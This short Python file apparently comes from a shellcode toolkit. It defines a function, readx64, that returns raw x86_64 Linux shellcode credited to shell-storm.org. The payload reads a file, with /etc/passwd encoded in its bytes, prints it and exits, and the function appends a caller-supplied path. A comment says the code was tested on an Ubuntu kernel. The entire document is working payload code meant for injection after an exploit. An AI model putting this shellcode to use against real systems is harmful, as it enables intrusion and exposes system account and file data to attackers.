#http://shell-storm.org/shellcode/files/shellcode-878.php
#; Author Mr.Un1k0d3r - RingZer0 Team
#; Read /etc/passwd Linux x86_64 Shellcode
#; Shellcode size 82 bytes

#WORK TESTED
#Linux whoami 3.19.0-37-generic #42~14.04.1-Ubuntu SMP Mon Nov 23 15:13:51 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
def readx64( path):
	shellcode =  r"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31"
	shellcode += r"\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89"
	shellcode += r"\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48"
	shellcode += r"\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01"
	shellcode += r"\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff"
	shellcode += r"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"
	shellcode += path
	return shellcode



